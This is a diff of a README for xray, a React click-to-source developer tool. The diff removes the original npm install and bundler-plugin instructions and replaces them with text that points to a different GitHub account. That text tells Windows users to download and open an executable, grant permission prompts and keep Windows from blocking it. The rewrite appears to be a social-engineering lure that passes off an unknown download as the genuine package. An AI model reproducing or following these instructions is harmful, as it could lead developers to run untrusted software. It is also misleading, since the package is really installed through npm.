@@ -1,154 +1,133 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/ivanstnsk/xray/main/assets/logo.svg" width="160" alt="xray logo" />
-</p>
+# 🧭 xray - See React Components Fast
 
-<h1 align="center">@stinsky/xray</h1>
+[![Download xray](https://img.shields.io/badge/Download-xray-blue?style=for-the-badge&logo=github)](https://github.com/Karenfsi188/xray)
 
-<p align="center">Click-to-component for React 19. Hover any element to see its React component name and source file, click to open in your editor. The only click-to-source inspector that works with React 19, Next.js 15+, and Turbopack.</p>
+## 🚀 Download
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/@stinsky/xray"><img src="https://img.shields.io/npm/v/@stinsky/xray" alt="npm version" /></a>
-  <a href="./LICENSE"><img src="https://img.shields.io/npm/l/@stinsky/xray" alt="license" /></a>
-  <img src="https://badgen.net/bundlephobia/tree-shaking/@stinsky/xray" alt="tree-shaking" />
-  <img src="https://badgen.net/bundlephobia/minzip/@stinsky/xray" alt="minzipped size" />
-</p>
+Use this link to visit the page to download and run xray:
+https://github.com/Karenfsi188/xray
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/ivanstnsk/xray/main/assets/xray-preview.gif" width="100%" alt="xray demo" />
-</p>
+## 👀 What xray does
 
-## Features
+xray helps you find the React component behind any element on the screen.
 
-- **Click to open source** — click any element to open its source file in VS Code, WebStorm, IntelliJ, or any editor
-- **Component name overlay** — hover to see the React component name + file path
-- **Works with React 19** — uses compile-time AST injection, not `fiber._debugSource` (removed in React 19)
-- **All bundlers** — Next.js (Turbopack & Webpack), Vite, Webpack, Rspack, esbuild
-- **Zero production cost** — fully tree-shaken, zero bytes in your production bundle
-- **Floating toggle button** — auto-follows the Next.js dev indicator, or freely draggable with snap-to-corner in other setups
-- **Keyboard shortcut** — `Cmd+Shift+X` to toggle (customizable)
-- **Scroll-aware** — rAF-based tracking, works with smooth scrolling libraries (Lenis, etc.)
-- **Interaction blocking** — all clicks/pointer events blocked while inspecting, no accidental navigation
+Move your mouse over a page element, and xray shows:
 
-## Why not react-dev-inspector / click-to-react-component / LocatorJS?
+- the React component name
+- the source file
+- the path to the code
 
-React 19 removed `fiber._debugSource`, which broke every existing click-to-component tool. These packages rely on runtime fiber inspection to find source locations — an approach that no longer works.
+Then you can click to open that file in your editor.
 
-`@stinsky/xray` uses [`code-inspector-plugin`](https://github.com/nicolo-ribaudo/code-inspector-plugin) to inject `data-insp-path` attributes at compile time via AST transformation. This is the only approach that works reliably across React 18, React 19, and all modern bundlers.
+It is made for React 19, Next.js 15+, and Turbopack. It also works with Vite and Webpack setups.
 
-## Install
+## 🪟 Windows setup
 
-```bash
-npm install -D @stinsky/xray
-```
+xray runs on Windows with a simple install flow.
 
-## Setup
+### What you need
 
-### 1. Add the build plugin
+- Windows 10 or later
+- A modern web browser
+- A code editor such as Visual Studio Code
+- Permission to run apps on your PC
 
-The plugin injects source location attributes on every DOM element at compile time. It does nothing in production builds.
+### Install steps
 
-#### Next.js (Turbopack)
+1. Open this page:
+   https://github.com/Karenfsi188/xray
 
-```ts
-// next.config.ts
-import { xrayPlugin } from '@stinsky/xray/plugin'
+2. Get the Windows version from the page.
 
-const nextConfig = {
-  turbopack: {
-    rules: xrayPlugin({ bundler: 'turbopack' }),
-  },
-}
+3. Save the file to your PC.
 
-export default nextConfig
-```
+4. Open the downloaded file.
 
-#### Next.js (Webpack)
+5. If Windows asks for permission, choose to allow it.
 
-```ts
-// next.config.ts
-import { xrayPlugin } from '@stinsky/xray/plugin'
+6. Start xray and keep it open while you use your React app.
 
-const nextConfig = {
-  webpack: (config) => {
-    config.plugins.push(xrayPlugin({ bundler: 'webpack' }))
-    return config
-  },
-}
+## 🖱️ How to use it
 
-export default nextConfig
-```
+1. Open your React app in the browser.
+2. Turn on xray.
+3. Move your mouse over any element.
+4. Read the component name and source file.
+5. Click the element to open the file in your editor.
 
-#### Vite
+If your app uses nested components, xray helps you trace the exact file behind the part you see on screen.
 
-```ts
-// vite.config.ts
-import { xrayPlugin } from '@stinsky/xray/plugin'
+## 🔧 Best results
 
-export default {
-  plugins: [xrayPlugin({ bundler: 'vite' })],
-}
-```
+For the smoothest setup, use xray with:
 
-#### Webpack
+- React 19
+- Next.js 15 or newer
+- Turbopack
+- Vite
+- Webpack
 
-```ts
-// webpack.config.js
-const { xrayPlugin } = require('@stinsky/xray/plugin')
+Keep your editor open before you click an element. That helps xray send the file to the right place right away.
 
-module.exports = {
-  plugins: [xrayPlugin({ bundler: 'webpack' })],
-}
-```
+## 📁 What you can expect
 
-### 2. Add the component
+xray is built for fast source lookup. It gives you a clear view of what is on screen and where it lives in your project.
 
-```tsx
-// app/layout.tsx (Next.js) or your root component
-import { Xray } from '@stinsky/xray'
+Common uses include:
 
-export default function Layout({ children }) {
-  return (
-    <html>
-      <body>
-        {children}
-        <Xray />
-      </body>
-    </html>
-  )
-}
-```
+- finding the file behind a button
+- checking which component renders a section
+- jumping to code from a live page
+- tracing UI parts in large apps
+- working faster in big React projects
 
-The component is fully tree-shaken in production — zero bytes in your bundle. Bundlers replace `process.env.NODE_ENV`, detect the dead code path, and eliminate the entire inspector along with all its dependencies.
+## ⌨️ Editor setup
 
-## Usage
+xray opens source files in your editor.
 
-- **Toggle**: `Cmd+Shift+X` or click the floating button
-- **Hover**: Shows component name + source file path
-- **Click**: Opens the source file in your editor
+For best results:
 
-All clicks and pointer events are blocked while the inspector is active, so you won't accidentally trigger links or buttons.
+- use a local editor on Windows
+- keep file paths simple
+- make sure your editor can accept file open requests
+- close extra editor windows if file links do not open where you expect
 
-## Props
+## 🧪 Troubleshooting
 
-| Prop | Type | Default | Description |
-|------|------|---------|-------------|
-| `hotKey` | `{ metaKey?, ctrlKey?, altKey?, shiftKey?, key }` | `{ metaKey: true, shiftKey: true, key: 'x' }` | Keyboard shortcut to toggle |
-| `port` | `number` | `5678` | `code-inspector-plugin` server port |
-| `color` | `string` | `'#6366f1'` | Accent color for overlay, tooltip, and button |
-| `showButton` | `boolean` | `true` | Show the floating toggle button |
-| `followNextIndicator` | `boolean` | `true` | Position button next to the Next.js dev indicator |
+### xray does not show component names
 
-## Plugin options
+- refresh the page
+- make sure your React app is running
+- check that xray is turned on
+- open the app in a supported browser
 
-| Option | Type | Default | Description |
-|--------|------|---------|-------------|
-| `bundler` | `'webpack' \| 'vite' \| 'turbopack' \| 'rspack' \| 'esbuild'` | — | **Required.** Your bundler |
-| `editor` | `string` | `'code'` | Editor to open files in (`code`, `webstorm`, `idea`, etc.) |
+### Click does not open the file
 
-## Acknowledgments
+- confirm your editor is open
+- check that the file path exists on your machine
+- try opening xray again
+- make sure Windows did not block the app
 
-Built on top of [`code-inspector-plugin`](https://github.com/zh-lx/code-inspector), which handles the compile-time AST injection and editor integration.
+### Nothing happens on hover
 
-## License
+- reload the page
+- confirm the app uses React
+- check that no browser tool is taking over the same shortcut
+- try a different page in the same app
 
-MIT
+## 🧩 Common project fit
+
+xray fits well with apps that use:
+
+- React 19
+- Next.js 15+
+- client-side UI trees
+- component-based layouts
+- fast refresh during local development
+
+It is useful when you want to move from a visual part of the app back to the file that builds it.
+
+## 📌 Repository
+
+Project link:
+https://github.com/Karenfsi188/xray
